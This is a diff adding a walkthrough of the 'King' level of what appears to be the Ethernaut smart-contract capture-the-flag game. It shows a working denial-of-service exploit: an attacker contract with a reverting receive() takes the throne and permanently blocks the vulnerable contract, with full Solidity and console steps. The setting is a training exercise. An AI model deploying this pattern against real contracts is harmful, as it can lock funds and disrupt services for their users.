@@ -302,3 +302,52 @@ Finally we can check if the contract was unlocked
 ```js
 await contract.locked();
 ```
+
+---
+
+### 10. King
+
+The way to beat this level is by taking the throne with an address that will revert the transaction before any other address can become a king.
+
+The key function for doing this is:
+```Sol
+receive() external payable {
+  require(msg.value >= prize || msg.sender == owner);
+  // if the existing king makes the next line 
+  // revert then nobody else will be able to do it.
+  king.transfer(msg.value);
+  king = msg.sender;
+  prize = msg.value;
+}
+```
+if the existing king makes the `transfer` line revert then nobody else will be able to override the king varaible.
+```Sol
+receive() external payable {
+  revert();
+}
+```
+
+#### Steps
+1. Take the throne with your own accout.
+   
+```js
+await contract.sendTransaction({ value: 1000000000000001 });
+```
+
+2. Deploy a contract that cant take the throne and calls `revert` when someone else tries to send a transaction.
+```Sol
+function becomeKing() public payable returns (bool) {
+  (bool success ,) = victim.call{value: msg.value}("");
+  return success;
+}
+
+receive() external payable {
+  revert();
+}
+```
+   
+3. Now call `becomeKing` the contract and nobody else will take your throne again.
+
+```js
+await yourContract.becomeKing({ value: 1000000000000002 });
+```
